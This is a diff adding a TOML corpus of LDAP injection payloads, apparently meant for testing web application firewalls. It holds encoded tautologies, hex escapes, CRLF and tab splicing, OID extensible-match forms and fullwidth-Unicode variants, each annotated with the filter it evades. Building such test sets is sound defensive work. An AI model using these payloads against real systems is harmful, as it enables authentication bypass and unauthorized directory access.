@@ -1,0 +1,93 @@
+schema = 1
+# LDAP injection — encoding / escape evasion variants of the
+# canonical filter-injection patterns. CRS-class WAFs frequently
+# normalise URL-encoding but miss double-URL-encoding and the
+# whitespace-folded variants; these payloads pin the gaps.
+
+# ── URL-encoded variants of the boolean-true tautology ──
+
+[[case]]
+id = "tautology_url_encoded"
+class = "ldap"
+payload = "%2a%29%28uid%3d%2a%29%29%28%7c%28uid%3d%2a"
+description = "Standard tautology, fully URL-encoded — single-decode WAFs miss"
+
+[[case]]
+id = "tautology_double_url_encoded"
+class = "ldap"
+payload = "%252a%2529%2528uid%253d%252a%2529%2529%2528%257c%2528uid%253d%252a"
+description = "Double URL-encoded — defeats parsers that decode exactly once"
+
+[[case]]
+id = "tautology_partial_url_encoded"
+class = "ldap"
+payload = "*%29%28uid=*))(|(uid=*"
+description = "Only the LDAP metacharacters URL-encoded; alnum stays raw"
+
+# ── LDAP hex-escape variants (RFC 4515 §3) ──
+
+[[case]]
+id = "hex_escape_open_paren"
+class = "ldap"
+payload = "\\28uid=*\\29\\29(|(uid=*"
+description = "RFC 4515 hex-escaped parens (\\28 = '(', \\29 = ')') —  some WAFs scan unescaped chars only"
+
+[[case]]
+id = "hex_escape_asterisk"
+class = "ldap"
+payload = "\\2auid=admin\\2a"
+description = "Asterisk hex-escaped (\\2a) — preserves wildcard semantics  while evading literal-asterisk rules"
+
+[[case]]
+id = "hex_escape_backslash"
+class = "ldap"
+payload = "\\5cuid=admin"
+description = "Backslash escape itself (\\5c = '\\') — meta on meta"
+
+# ── Whitespace / structural padding ──
+
+[[case]]
+id = "tautology_with_internal_spaces"
+class = "ldap"
+payload = "*) (uid=*)) (|(uid=*"
+description = "Spaces between filter components — RFC says ignored; WAFs  that strip whitespace fold to the canonical attack but  rules pattern-matching the exact string miss"
+
+[[case]]
+id = "tautology_with_tabs"
+class = "ldap"
+payload = "*)\t(uid=*)\t(|(uid=*"
+description = "Tabs instead of spaces — same idea, different whitespace class"
+
+[[case]]
+id = "tautology_with_crlf"
+class = "ldap"
+payload = "*)\r\n(uid=*))\r\n(|(uid=*"
+description = "CRLF-spliced filter — origins that accept folded queries  process; line-anchored WAF regex misses"
+
+# ── Extensible-match operator obfuscation (RFC 4517) ──
+
+[[case]]
+id = "extensible_match_oid"
+class = "ldap"
+payload = "*)(uid:1.3.6.1.4.1.1466.115.121.1.15:=admin"
+description = "Extensible match with explicit OID instead of attribute name;  WAFs that allowlist by attribute name miss"
+
+[[case]]
+id = "extensible_match_dn_attr"
+class = "ldap"
+payload = "*)(2.5.4.3:dn:=admin"
+description = "Common-name attribute via OID + dn modifier — same vector,  different surface"
+
+# ── Unicode normalisation ──
+
+[[case]]
+id = "fullwidth_asterisk"
+class = "ldap"
+payload = "＊)(uid=*"
+description = "U+FF0A fullwidth asterisk — NFKC-normalising parsers fold  to '*'; literal-asterisk WAF rules miss"
+
+[[case]]
+id = "fullwidth_paren_close"
+class = "ldap"
+payload = "*）(uid=admin"
+description = "U+FF09 fullwidth right paren — closes the previous filter  under NFKC normalisation"
